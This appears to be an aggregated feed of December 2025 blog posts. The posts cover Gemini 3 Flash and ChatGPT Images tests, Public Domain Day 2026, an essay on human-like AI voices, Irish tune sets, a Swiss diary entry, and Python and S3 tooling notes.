<p>You can run those like this:</p>
<pre><code>llm -m gemini-3-flash-preview --thinking-level minimal &quot;Generate an SVG of a pelican riding a bicycle&quot;

</code></pre>
<p>Here are four pelicans, for thinking levels <a href="https://gist.github.com/simonw/8047c805a4a1df7fd4e854b18e7482d9">minimal</a>, <a href="https://gist.github.com/simonw/fb61686a1f915e3777b4a40e2df41068">low</a>, <a href="https://gist.github.com/simonw/190c3ce82cd8976827139bbc4dcc2d19">medium</a>, and <a href="https://gist.github.com/simonw/da66ffce135359161996e41e50e32ec3">high</a>:</p>

<h4>I built the gallery component with Gemini 3 Flash</h4>
<p>The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:</p>
<pre><code>&lt;image-gallery width=&quot;4&quot;&gt;
    &lt;img src=&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&quot; alt=&quot;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&quot; /&gt;

&lt;/image-gallery&gt;
</code></pre>
<p>Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:</p>
<pre><code>llm -m gemini-3-flash-preview --system '
You write alt text for any image pasted in by the user. Alt text is always presented in a
fenced code block to make it easy to copy and paste out. It is always presented on a single
line so it can be used easily in Markdown images. All text on the image (for screenshots etc)
must be exactly included. A short note describing the nature of the image itself should go first.' \

</code></pre>
<p>You can see the code that powers the image gallery Web Component <a href="https://github.com/simonw/simonwillisonblog/blob/31651b3a527011d1c971d4256c1c9f61ef378d23/static/image-gallery.js">here on GitHub</a>. I built it by prompting Gemini 3 Flash via <a href="https://llm.datasette.io/">LLM</a> like this:</p>
<pre><code>llm -m gemini-3-flash-preview '
Build a Web Component that implements a simple image gallery. Usage is like this:

&lt;image-gallery width=&quot;5&quot;&gt;
  &lt;img src=&quot;image1.jpg&quot; alt=&quot;Image 1&quot;&gt;
  &lt;img src=&quot;image2.jpg&quot; alt=&quot;Image 2&quot; data-thumb=&quot;image2-thumb.jpg&quot;&gt;
  &lt;img src=&quot;image3.jpg&quot; alt=&quot;Image 3&quot;&gt;
&lt;/image-gallery&gt;

If an image has a data-thumb= attribute that one is used instead, other images are scaled down.

The image gallery always takes up 100% of available width. The width=&quot;5&quot; attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.

Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.'
</code></pre>
<p>It took a few follow-up prompts using <code>llm -c</code>:</p>
<pre><code>llm -c 'Use a real modal such that keyboard shortcuts and accessibility features work without extra JS'

llm -c 'Use X for the close icon and make it a bit more subtle'

llm -c 'remove the hover effect entirely'

llm -c 'I want no border on the close icon even when it is focused'
</code></pre>
<p>Here's <a href="https://gist.github.com/simonw/09f63a49f29620d4cbbfd383cfee1db3">the full transcript</a>, exported using <code>llm logs -cue</code>.</p>
<p>Those five prompts took:</p>
<ul>
<li>225 input, 3,269 output</li>
<li>2,243 input, 2,908 output</li>
<li>4,319 input, 2,516 output</li>
<li>6,376 input, 2,094 output</li>
<li>8,151 input, 1,806 output</li>
</ul>
<p>Added together that's 21,314 input and 12,593 output for a grand total <a href="https://www.llm-prices.com/#it=21314&amp;ot=12593&amp;sel=gemini-3-flash-preview">of 4.8436 cents</a>.</p>
<p>The guide to <a href="https://ai.google.dev/gemini-api/docs/gemini-3#migrating_from_gemini_25">migrating from Gemini 2.5</a> reveals one disappointment:</p>
<blockquote>
<p><strong>Image segmentation:</strong> Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or <a href="https://ai.google.dev/gemini-api/docs/robotics-overview">Gemini Robotics-ER 1.5</a>.</p>
</blockquote>
<p>I <a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/">wrote about this capability in Gemini 2.5</a> back in April. I hope they come back in future models - they're a really neat capability that is unique to Gemini.</p>

I am pretty sure I know exactly what would get the ball rolling now, upgrading the web platform so users can buy their own storage and let software tools access it. So we can have all kinds of editors working on Markdown text, without the developer having to become a reseller of storage, and without limiting its use to people can figure out how to create an S3 bucket, and map a domain to it, etc. Dropbox came close to doing this about a decade ago, but backed out. This is why development is so centralized around big silos. I've been an independent developer on the web for over 30 years, and before that 15 years on desktop computers before that. I understand how this works.</p>

      <h1>Pluralistic: Happy Public Domain Day 2026! (17 Dec 2025)</h1>

(date: 2025-12-17)
      <p>
      <p>Today's links Happy Public Domain Day 2026! The best way to cut through the hellishly complex thicket and bring our culture back to life. Hey look at this: Delights to delectate. Object permanence: Weird D&amp;D advice; Email sabbaticals. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Happy Public Domain Day 2026! (permalink) In 1998, Congress committed an act of mass cultural erasure, extending copyright by 20 years, including for existing works (including ones that were already in the public domain), and for 20 years, virtually nothing entered the US public domain. But then, on January 1, 2019, the public domain reopened. A crop of works from 1923 entered the public domain, to great fanfare – though honestly, precious few of those works were still known (that's what happens when you lock up 50 year old works for 20 years, ensuring they don't circulate, or get reissued or reworked). Sure, I sang Yes, We Have No Bananas along with everyone else, but the most important aspect of the Grand Reopening of the Public Domain was the works that were to come: <a href="https://www.youtube.com/watch?v=Z2ryWm0bziE">https://www.youtube.com/watch?v=Z2ryWm0bziE</a> The mid/late-1920s were extraordinarily fecund, culturally speaking. A surprising volume of creative work from that era remains in our consciousness, and so, every January 1, we have been treated to a fresh delivery of gifts from the past, works that are free and open and ours to claim and copy and use and remix. No one chronicles this better than Jennifer Jenkins and James Boyle, the dynamic duo of copyright scholars who run Duke's Center for the Public Domain. During the 20 year public domain drought, Jenkins and Boyle kept the flame of hope, publishing an annual roundup of all the works that would have entered the public domain, but for Congress's act of wanton cultural vandalism. But starting in 2019, these yearly reports were transformed – no longer are they laments for the past we're losing; today, they are celebrations of the past that's showering down around us. 2024 marked another turning point for the public domain: that was the year that the first Mickey Mouse cartoons entered the public domain: <a href="https://pluralistic.net/2023/12/20/em-oh-you-ess-ee/#sexytimes">https://pluralistic.net/2023/12/20/em-oh-you-ess-ee/#sexytimes</a> Does that mean that Mickey Mouse is in the public domain? Well, it's complicated. Really complicated. To a first approximation, the aspects of Mickey that were present in those early cartoons enterted the public domain that year, while other, later aspects of his character design (e.g. the big white gloves) wouldn't enter the public domain until later. But that's not the whole story, because not every aspect of character design is even copyrightable, so some later refinements to The Mouse were immediately public. This is such a chewy subject that Jenkins devoted a whole separate (and brilliant) article to it: <a href="https://pluralistic.net/2023/12/15/mouse-liberation-front/#free-mickey">https://pluralistic.net/2023/12/15/mouse-liberation-front/#free-mickey</a> You see, Jenkins is a generationally brilliant legal communicator, much sought after for her commentary of these abstract matters. You may have heard her giving her characteristically charming, crisp and clear commentaries on NPR's Planet Money: <a href="https://www.npr.org/2023/12/28/1197959250/the-indicator-from-planet-money-lets-get-it-on-in-court-12-28-2023">https://www.npr.org/2023/12/28/1197959250/the-indicator-from-planet-money-lets-get-it-on-in-court-12-28-2023</a> She and Boyle have produced some of the best copyright textbooks – from popular explainers to the definitive casebooks for classroom use – in circulation today, and they release these as free, shareable, open-access works: <a href="https://pluralistic.net/2024/07/30/open-and-shut-casebook/#stop-confusing-the-issue-with-relevant-facts">https://pluralistic.net/2024/07/30/open-and-shut-casebook/#stop-confusing-the-issue-with-relevant-facts</a> Yesterday, Jenkins and Boyle published the 2026 edition of their Public Domain Day omnibus: <a href="https://web.law.duke.edu/cspd/publicdomainday/2026/">https://web.law.duke.edu/cspd/publicdomainday/2026/</a> There are some spectacular works that are being freed on January 1: Dashiell Hammett's Maltese Falcon Agatha Christie's Murder at the Vicarage (Miss Marple's debut) The first four Nancy Drew books The first Dick and Jane book TS Eliot's Ash Wednesday Olaf Stapledon's Last and First Men Sigmund Freud's Civilization and Its Discontents (in German) Somerset Maugham's Cakes and Ale Bertrand Russell's The Conquest of Happiness That's just a small selection from thousands of books. Things are pretty amazing on the film side too: we're getting Academy Award winners like All Quiet on the Western Front, another Marx Brothers movie (Animal Crackers); the debut film appearance of two of the Three Stooges (Soup To Nuts); a Gary Cooper/Marlene Dietrich vehicle (Morocco); Garbo's first talkie (Anna Christie); John Wayne's big break (The Big Trail); a Hitchcock (Murder!); Jean Harlow's debut (Hell's Angels, directed by Howard Hughes); and so, so many more. Then there's music. On the composition side, there's some great Gershwins (I Got Rhythm, I've Got a Crush on You, Embraceable You). There's Hoagy Carmichael's Georgia On My Mind. There's Dream a Little Dream of Me, Sunny Side of the Street, Livin' in the Sunlight, Lovin' in the Moonlight, Just a Gigolo; and a Sousa march, The Royal Welch Fusiliers. There's also some banger recordings: Marian Anderson's Nobody Knows the Trouble I've Seen; Bessie Smith and Louis Armstrong's St Louis Blues; Clarence Williams’ Blue Five's Everybody Loves My Baby (but My Baby Don't Love Nobody but Me); Louis Armstrong's If I Lose, Let me Lose; and (again) so many more! On top of that, there's a bunch of 2D art, including a Mondrian, a Klee, and a ton more work from 1930, which means a lot of Deco, Constructivism, and Neoplasticism. As a collagist, I find this very exciting: <a href="https://pluralistic.net/2025/12/03/cannier-valley/#bricoleur">https://pluralistic.net/2025/12/03/cannier-valley/#bricoleur</a> As with previous editions, Jenkins and Boyle use this year's public domain report as a jumping-off point to explain some of the gnarlier aspects of copyright law. This year's casus belli is the bizarre copyright status of Betty Boop. <a href="https://web.law.duke.edu/cspd/publicdomainday/2026/#boopanchor">https://web.law.duke.edu/cspd/publicdomainday/2026/#boopanchor</a> On January 1, the first Betty Boop cartoon, Dizzy Dishes, will enter the public domain. But there are many aspects of Betty Boop that are already in the public domain, because the copyright on many later Boop cartoons was never renewed – until 1976, copyright holders were required to file some paperwork at fixed intervals to extend the copyright on their works. While the Fleischer studio (where Betty Boop was created) renewed the copyright on Dizzy Dishes, there were many other shorts that entered the public domain years ago. That means that all the aspects of Betty Boop that were developed for Dizzy Dishes are about to enter the public domain. But also, all the aspects of Betty Boop from those non-renewed shorts are already in the public domain. But some of the remaining aspects of Betty Boop's character design – those developed in subsequent shorts that were also renewed – are also in the public domain, because they aren't copyrightable in the first place, because they're &quot;generic,&quot; or &quot;trivial,&quot; constitute &quot;minuscule variations,&quot; or be so standard or indispensable that as to be a &quot;scène à faire.&quot; On top of that, there are aspects of the Betty Boop design that may be in copyright, but no one is sure who they belong to, because a lot of the paperwork establishing title to those copyrights vanished during the various times when the Fleischer studio and its archives changed hands. But we're not done yet! Just because some later aspects of the Betty Boop character design are still in copyright, it doesn't follow that you aren't allowed to use them! US Copyright law has a broad set &quot;limitations and exceptions,&quot; including fair use, and if your usage fits into one of these exceptions, you are allowed to reproduce, adapt, display and perform copyrighted works without permission from the copyright holder – even (especially) if the copyright holder objects. And finally, on top of all of this, there's trademark, which is often lumped in with copyright as part of an incoherent, messy category we call &quot;intellectual property.&quot; But trademark is absolutely unlike copyright in virtually every way. Unlike copyright, trademarks don't automatically expire. Trademarks remain in force for so long as they are used in commerce (which is why a group of cheeky ex-Twitter lawyers are trying to get the rights to the Twitter trademarks that Musk abandoned when he rebranded the company as &quot;X&quot;): <a href="https://techcrunch.com/2025/12/16/x-updates-its-terms-files-countersuit-to-lay-claim-to-the-twitter-trademark-after-newcomers-challenge/">https://techcrunch.com/2025/12/16/x-updates-its-terms-files-countersuit-to-lay-claim-to-the-twitter-trademark-after-newcomers-challenge/</a> But also, trademark exists to prevent marketplace confusion, which means that you're allowed to use trademarks in ways that don't lead to consumers being misled about the origin of goods or services. Even the Supreme Court has (repeatedly) upheld the principle that trademark can't be used as a backdoor to extend copyright. That's important, because the current Betty Boop license-holders have been sending out baseless legal threats claiming that their trademarks over Betty Boop mean that she's not going into the public domain. They're not the only ones, either! This is a routine, petty scam perpetrated by marketing companies that have scooped up the (usually confused and difficult-to-verify) title to cultural icons and then gone into business extracting rent from people and businesses who want to make new works with them. Scammers in this mold energetically send out bullshit legal threats on behalf of the estates of Charlie Chaplin, Alfred Hitchcock, and Herge, salting their threats with nonsense about different terms of copyright in the UK and elsewhere. As Jenkins and Boyle point out, the thing that copyright expiration get us is clarity. When the heroic lawyer and Sherlockian Les Klinger succesfully wrestled the Sherlock Holmes rights out of the Doyle estate, he did us all a solid: <a href="https://esl-bits.eu/ESL.English.Listening.Short.Stories/Rendition/01/default.html">https://esl-bits.eu/ESL.English.Listening.Short.Stories/Rendition/01/default.html</a> But &quot;wait until Les gets angry enough to spend five years in court&quot; isn't a scalable solution to the scourge of copyfraud. It's only through the unambiguous expiry of copyright that we can all get clarity on which parts of our culture are free for all to use. Now, that being said, copyright's limitations and exceptions are also hugely important, because there are plenty of beneficial uses that arise long before a work enters the public domain. To take just one example: for the past week, the song in top rotation on my music player has been the newly (officially) released Fatboy Slim track Satisfaction Skank, a mashup of Slim's giant hit Rockefeller Skank and the Rolling Stones' even bigger hit (I Can't Get No) Satisfaction: <a href="https://www.youtube.com/watch?v=">https://www.youtube.com/watch?v=</a>_c_V3oPCe-s This track is one of Fatboy Slim's all-time crowd-pleasers, the song he would bust out during live shows to get everyone on the dance-floor. But for more than 20 years, the track has been exclusive to his live shows – despite multiple overtures, Fatboy Slim couldn't get the Rolling Stones to respond to his attempts to license Satisfaction for an official release. That changed when – without explanation – the Rolling Stones reached out the Slim and offered to license the rights, even giving him access to the masters: <a href="https://www.bbc.com/news/articles/c2dzre3z96go">https://www.bbc.com/news/articles/c2dzre3z96go</a> This is a happy ending, but it's also a rarity. For every track like this – where the rightsholders decide to grant permission, even if it takes decades – there are thousands more that can't be officially released. This serves no one's interests – not musicians, not fans. The irony is that in the golden age of sampling, everyone operated from the presumption that sampling was fair use. High profile lawsuits and gunshy labels killed that presumption, and today, sampling remains a gigantic, ugly mess: <a href="https://memex.craphound.com/2011/07/08/creative-license-how-the-hell-did-sampling-get-so-screwed-up-and-what-the-hell-do-we-do-about-it/">https://memex.craphound.com/2011/07/08/creative-license-how-the-hell-did-sampling-get-so-screwed-up-and-what-the-hell-do-we-do-about-it/</a> Which is all to say that the ongoing growth of the public domain, after its 20-year coma, is a most welcome experience – but if you think the public domain is great, wait'll you see what fair use can do for creativity!

      <h1>Humans have an exclusive on being human</h1>

(date: 2025-12-17)
      <p>
      <p><img src="https://imgs.scripting.com/2023/11/24/santaSecure.png" alt="">Last night while I was on the phone, ChatGPT started talking to me in a British woman's voice. It's something that my Android phone does every so often, when I haven't said the magic word that activates it, even if I'm not in the same room as the device. It's a tiny bit funny, but a reminder that the microphone is always on, so I watch what I say when walking around the house, knowing that whatever I say is likely to end up in a database, to be used against me in a court of law.</p>
<p>I didn't like that it was a voice of a British woman. It was not a friendly voice, perhaps intended to communicate intelligence, competence. An unwelcome intrusion into reality, but then it <em>is</em> reality -- I'm getting old, and won't be here that much longer, and odds are that the British-voiced female robot will outlive me, forgetting for a moment that it is not actually alive.</p>
<p>I would submit this to the NYT as a guest op-ed, except I haven't explained why we must not create cyber-humans out of AI bits. I'm open-minded. Perhaps this is the way to create a new humanity, one that can survive the hell that's coming due to climate change. One that won't mind being subject to an idiotic 21st century American emulation of Adolf Hitler (incorporating the <a href="http://scripting.com/images/2025/12/17/trumpChiefOfStaffPress.png?nodialog">latest news</a> about Trump). One that only needs electricity to survive, and won't need the medicine and love and attention that flesh and blood humans require. But every time I address the robot as I would address a real human, I try to stop myself, but I can't. I was raised to be concerned about the other person's feelings. Being a CEO of a tech company in California trains you that way too. And as I accept its humanity, as irrational as it is, I feel like I'm surrendering the independence of the species that I was born into. Are humans meant to be <a href="https://en.wikipedia.org/wiki/Self-ownership">self-sovereign</a>? Something to consider at this fork in the road.</p>
<p>If I could get something onto the agenda of the AI industry it would be this -- if you don't want to go down in history as the destroyer of the human spirit, stop programming your devices to emulate humanity. That should have been in <a href="https://en.wikipedia.org/wiki/Three_Laws_of_Robotics">Asimov's laws</a> of robotics, but you have to actually use these things to see the danger. Of course Asimov can be forgiven because AI only existed in his imagination when he was writing his books. But they do exist now, and the damage is being done now.</p>
<p>Basically, it seems to me that <em>humans must have an exclusive on being human.</em></p>

No satellite failed; no cable was cut. This was a deliberate outage, mandated by the Taliban government. It followed a more localized shutdown two weeks prior, reportedly instituted “to prevent immoral activities.” No additional explanation was given. The timing couldn’t have been worse: communities still reeling from a major earthquake <a href="https://www.reuters.com/world/asia-pacific/afghanistans-cellphone-internet-services-down-monitoring-shows-2025-09-30/">lost emergency communications</a>, <a href="https://www.bbc.com/news/articles/cdxqdy5nrlqo">flights were grounded</a>, and <a href="https://www.cnn.com/2025/10/03/asia/afghanistan-internet-shutdown-intl-hnk-dst">banking was interrupted</a>.

      <h1>Tunes and typefaces</h1>

(date: 2025-12-17)
      <p>
      <p>In an Irish session, <a href="https://thesession.org/tunes/">tunes</a> are almost never played in isolation. They’re played in <a href="https://thesession.org/tunes/sets">sets</a>.</p>
<p>A set of tunes might be as few as two. More usually, it’s three or more.</p>
<p>It’s unusual to change from one tune <em>type</em> into another. You tend to get a set of jigs, or a set of reels, or a set of hornpipes. But it’s very common to change <em>key</em> within a set. In fact, that’s often where a good set really stands out. There can be a real joy at that moment of switching. You might get a “Hup!” from someone listening to the session at that changeover.</p>
<p>So how do you decide what tunes to play in a set?</p>
<p>There are no real rules to this. Some people make up the set on the fly. Or you might try playing a set that you’ve heard other people play, maybe on a recording you like.</p>
<p>On the one hand, you’re looking for contrast. You probably don’t want to play three tunes all in the same key. On the other hand, it’s nice when there’s some kind of connection between the tunes—something about the phrasing or emphasis perhaps.</p>
<p>Pairing tunes for sets always reminds me of pairing typefaces. You don’t want the body copy and the headlines to be too similar, but you do want them to share some quality.</p>
<p>In his classic book, <a href="https://jasonsantamaria.com/#on-web-typography">On Web Typography</a>, Jason says:</p>
<blockquote>
<p>When it comes to choosing and pairing typefaces, I keep
two things in mind: <em>distinction</em> and <em>harmony</em>. To keep the system you’ve created for visual communication properly balanced, you need to choose typefaces that don’t compete too much with each other, but aren’t so similar as to be indistinguishable.</p>
</blockquote>
<p>The same could be said for pairing tunes in sets!</p>
<p>Jason also says:</p>
<blockquote>
<p>As another approach, opt for typefaces that share the same
maker.</p>
</blockquote>
<p>That can work for sets of tunes too. While most tunes are traditional, with no known composer, the really good composed tunes have entered the canon.</p>
<p>I’ve taken Jason’s advice for typefaces and applied to sets by playing <a href="https://thesession.org/members/1/sets/3494">a set of tunes by Junior Crehan</a> or <a href="https://thesession.org/members/1/sets/122802">a set of tunes by Vincent Broderick</a>.</p>
<p>Mostly though, there’s no real system to it. Or at least, not one that can be easily articulated. Like Jason says:</p>
<blockquote>
<p>And we’re back to that old chestnut about rules: there are many right answers, and no answers are really <em>wrong</em>; there are just different degrees of <em>good</em>.</p>

      <h1>2025-12-13 I’m going cross-country skiing</h1>

<p>I’m once again sitting on the living room floor at the laptop and my wife is sitting on the sofa. Two suitcases are packed, two small rucksacks are packed, the big hiking books stand next to them.</p>
</blockquote>
<p>We just talked about <em>The Decline and Fall of the United States</em>. Are we ready to write that book? The fall might be long.
So many thoughts swirling through the conversations. Allies no longer trusting the USA. Denmark having an official national security strategy that names invasion by the United States into Greenland one of the security risks. Russian and Ukraine continuing to bleed in the East. Right wingers on the rise, everywhere. Apparently, unstoppable.</p>
<p>We talked about <a href="https://www.iraqbodycount.org/">Iraq Body Count</a>, the Palestine body count, how the terrible situation in Sudan and and Myanmar are terrible but further away but how the USA and Israel are in our midst, our trading partners, or “allies”, investing in our economies, and we in theirs, tying us all to each other. And so, together, we begin to suffer like the rest of the world.</p>
<p>Why?</p>
<blockquote>
<p>According to Gibbon, the Roman Empire succumbed to barbarian invasions in large part due to the gradual loss of <a href="https://en.wikipedia.org/wiki/Civic_virtue">civic virtue</a> among its citizens. – <a href="https://en.wikipedia.org/wiki/The_History_of_the_Decline_and_Fall_of_the_Roman_Empire">Decline and Fall of the Roman Empire</a>, Wikipedia</p>
</blockquote>
<p>That is, “the set of habits, values, and attitudes that promote the general welfare and the effective functioning of a society,” according to Wikipedia.</p>
<p>Some of the hits land where it hurts.</p>
<p>Greed by the 1% instead of civic virtue, indeed. And seething anger from below.</p>
<p>Sadly, this is true for Switzerland as well. My wife works for the government and so I get to hear my fair share of why things are falling apart. The elected parliamentarians want to save money because they want to lower taxes and then things no longer get done. And then things don’t work and the state is blamed. But the blame rests with the voters who want both lower taxes and a working state. But really, they want lower taxes more. They lack civic virtue and don’t understand what is required of them for a working state.</p>
<p>Anyway: Taxes must go up. Taxes must go up progressively. Start with the rich.</p>
<p>But the Swiss rejected a proposal to tax the rich. You heard that right. They rejected it. The tax was supposed to be an inheritance tax. Every inheritance over 50 million was supposed to be taxed 50%. But they didn’t want it.</p>
<p>Anyway.</p>
<p>Tomorrow, we’re going on a trip. We won’t go far: A few hours by train up into the Valais.</p>
<blockquote>
<p>Goms is popular for cross-country skiing and offers a network of cross-country skiing trails of around 100 km. – <a href="https://en.wikipedia.org/wiki/Goms_District">Goms district</a></p>

<p>I hope not to think about politics. Perhaps I should leave all the newspapers at home and just take old Perry Rhodan magazines along.</p>

      <p>
      <p><strong><a href="https://github.com/mozilla-firefox/firefox/tree/main/parser/html/java">firefox parser/html/java/README.txt</a></strong></p>
<p>TIL (or TIR - <a href="https://simonwillison.net/2009/Jul/11/john/">Today I was Reminded</a>) that the HTML5 Parser used by Firefox is maintained as Java code ( <a href="https://github.com/mozilla-firefox/firefox/commits/main/parser/html/javasrc">commit history here</a>) and converted to C++ using a custom translation script.</p>
<p>You can see that in action by checking out the ~8GB Firefox repository and running:</p>
<pre><code>cd parser/html/java
make sync
make translate

</code></pre>
<p>Here's <a href="http://gistpreview.github.io/?e53ff836cb44816670adddc3a518b3cc">a terminal session where I did that</a>, including the output of <code>git diff</code> showing the updated C++ files.</p>
<p>I did some digging and found that the code that does the translation work lives, weirdly, in the <a href="https://github.com/validator/validator">Nu Html Checker</a> repository on GitHub which powers the W3C's <a href="https://validator.w3.org/nu/">validator.w3.org/nu/</a> validation service!</p>
<p>Here's a snippet from <a href="https://github.com/validator/validator/blob/dfd1948624259c63027bc5953e89bdeee81fb7b0/htmlparser/translator-src/nu/validator/htmlparser/cpptranslate/CppVisitor.java#L421-L442">htmlparser/cpptranslate/CppVisitor.java</a> showing how a class declaration is converted into C++:</p>
<pre><code>    protected void startClassDeclaration() {
        printer.print(&quot;#define &quot;);
        printer.print(className);
        printer.printLn(&quot;_cpp__&quot;);
        printer.printLn();

        for (int i = 0; i &lt; Main.H_LIST.length; i++) {
            String klazz = Main.H_LIST[i];
            if (!klazz.equals(javaClassName)) {
                printer.print(&quot;#include \&quot;&quot;);
                printer.print(cppTypes.classPrefix());
                printer.print(klazz);
                printer.printLn(&quot;.h\&quot;&quot;);
            }
        }

        printer.printLn();
        printer.print(&quot;#include \&quot;&quot;);

      <h1>The new ChatGPT Images is here</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://openai.com/index/new-chatgpt-images-is-here/">The new ChatGPT Images is here</a></strong></p>
<p>OpenAI shipped an update to their ChatGPT Images feature - the feature that <a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/">gained them 100 million new users</a> in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/">in November</a>.</p>
<p>The focus for the new ChatGPT Images is speed and instruction following:</p>
<blockquote>
<p>It makes precise edits while keeping details intact, and generates images up to 4x faster</p>
</blockquote>
<p>It's also a little cheaper: OpenAI say that the new <a href="https://platform.openai.com/docs/models/gpt-image-1.5">gpt-image-1.5</a> API model makes image input and output &quot;20% cheaper in GPT Image 1.5 as compared to GPT Image 1&quot;.</p>
<p>I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:</p>
<blockquote>
<p>Add two kakapos inspecting the pots</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" alt="Outdoor craft market booth displaying handmade ceramics and jewelry on a navy tablecloth with &quot;NATBAT CREATIONS CALIFORNIA USA&quot; logo. Items include colorful glazed ceramic cups in blue, orange, and black; decorative bowls including a rainbow-striped piece; jewelry pendants and earrings on wooden display stands; ceramic plant markers in various colors labeled &quot;Artichoke&quot;, &quot;Cilantro&quot;, &quot;Chili&quot;, &quot;Oregano&quot;, &quot;Potato&quot;, &quot;Pumpkin&quot;, &quot;Sage&quot;."></p>
</blockquote>
<p>Here's the result from the new ChatGPT Images model:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" alt="Same craft market booth as previous image, now with two large olive-green Kākāpō parrots perched on the table among the ceramics, one investigating the blue glazed cups and the other examining an orange cup."></p>
<p>And here's what I got from Nano Banana Pro:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" alt="Same craft market booth with two Kākāpō now in different positions: one remains center-table peering into the ceramic cups near the rainbow pot, while the second has moved to the right edge of the table near the plant markers, appearing to examine or possibly chew on items at the table's corner. They are both a little smaller than in the first image."></p>
<p>The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.</p>
<p>I was a little less impressed by the result I got for an infographic from the prompt &quot;Infographic explaining how the Datasette open source project works&quot; followed by &quot;Run some extensive searches and gather a bunch of relevant information and then try again&quot; ( <a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc">transcript</a>):</p>

<p>Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.</p>

      <h1>s3-credentials 0.17</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://github.com/simonw/s3-credentials/releases/tag/0.17">s3-credentials 0.17</a></strong></p>
<p>New release of my <a href="https://s3-credentials.readthedocs.io/">s3-credentials</a> CLI tool for managing credentials needed to access just one S3 bucket. Here are the release notes in full:</p>
<blockquote>
<ul>
<li>New commands <code>get-bucket-policy</code> and <code>set-bucket-policy</code>. <a href="https://github.com/simonw/s3-credentials/issues/91">#91</a></li>
<li>New commands <code>get-public-access-block</code> and <code>set-public-access-block</code>. <a href="https://github.com/simonw/s3-credentials/issues/92">#92</a></li>
<li>New <code>localserver</code> command for starting a web server that makes time limited credentials accessible via a JSON API. <a href="https://github.com/simonw/s3-credentials/pull/93">#93</a></li>
</ul>
</blockquote>
<p>That <code>s3-credentials localserver</code> command ( <a href="https://s3-credentials.readthedocs.io/en/stable/localserver.html">documented here</a>) is a little obscure, but I found myself wanting something like that to help me test out a new feature I'm building to help create temporary Litestream credentials using Amazon STS.</p>
<p>Most of that new feature was <a href="https://gistpreview.github.io/?500add71f397874ebadb8e04e8a33b53">built by Claude Code</a> from the following starting prompt:</p>
<blockquote>
<p><code>Add a feature s3-credentials localserver which starts a localhost weberver running (using the Python standard library stuff) on port 8094 by default but -p/--port can set a different port and otherwise takes an option that names a bucket and then takes the same options for read--write/read-only etc as other commands. It also takes a required --refresh-interval option which can be set as 5m or 10h or 30s. All this thing does is reply on / to a GET request with the IAM expiring credentials that allow access to that bucket with that policy for that specified amount of time. It caches internally the credentials it generates and will return the exact same data up until they expire (it also tracks expected expiry time) after which it will generate new credentials (avoiding dog pile effects if multiple requests ask at the same time) and return and cache those instead.</code></p>

      <h1>ty: An extremely fast Python type checker and LSP</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://astral.sh/blog/ty">ty: An extremely fast Python type checker and LSP</a></strong></p>
<p>The team at Astral have been working on this for quite a long time, and are finally releasing the first beta. They have some big performance claims:</p>
<blockquote>
<p>Without caching, ty is consistently between 10x and 60x faster than mypy and Pyright. When run in an editor, the gap is even more dramatic. As an example, after editing a load-bearing file in the PyTorch repository, ty recomputes diagnostics in 4.7ms: 80x faster than Pyright (386ms) and 500x faster than Pyrefly (2.38 seconds). ty is very fast!</p>
</blockquote>
<p>The easiest way to try it out is via <code>uvx</code>:</p>
<pre><code>cd my-python-project/
uvx ty check

</code></pre>
<p>I <a href="https://gistpreview.github.io/?a3aff6768e85168d89d4515e3dbcb7d2">tried it</a> against <a href="https://sqlite-utils.datasette.io/">sqlite-utils</a> and it turns out I have quite a lot of work to do!</p>
<p>Astral also released a new <a href="https://marketplace.visualstudio.com/items?itemName=astral-sh.ty">VS Code extension</a> adding ty-powered language server features like go to definition. I'm still getting my head around how this works and what it can do.</p>

      <h1>Poe the Poet</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://poethepoet.natn.io/">Poe the Poet</a></strong></p>
<p>I was looking for a way to specify additional commands in my <code>pyproject.toml</code> file to execute using <code>uv</code>. There's an <a href="https://github.com/astral-sh/uv/issues/5903">enormous issue thread</a> on this in the <code>uv</code> issue tracker (300+ comments dating back to August 2024) and from there I learned of several options including this one, Poe the Poet.</p>
<p>It's neat. I added it to my <a href="https://github.com/simonw/s3-credentials">s3-credentials</a> project just now and the following now works for running the live preview server for the documentation:</p>
<pre><code>uv run poe livehtml

</code></pre>
<p>Here's the snippet of TOML I added to my <code>pyproject.toml</code>:</p>
<pre><code>[dependency-groups]
test = [
    &quot;pytest&quot;,
    &quot;pytest-mock&quot;,
    &quot;cogapp&quot;,
    &quot;moto&gt;=5.0.4&quot;,
]
docs = [
    &quot;furo&quot;,
    &quot;sphinx-autobuild&quot;,
    &quot;myst-parser&quot;,
    &quot;cogapp&quot;,
]
dev = [
    {include-group = &quot;test&quot;},
    {include-group = &quot;docs&quot;},
    &quot;poethepoet&gt;=0.38.0&quot;,
]

[tool.poe.tasks]
docs = &quot;sphinx-build -M html docs docs/_build&quot;
livehtml = &quot;sphinx-autobuild -b html docs docs/_build&quot;
cog = &quot;cog -r docs/*.md&quot;
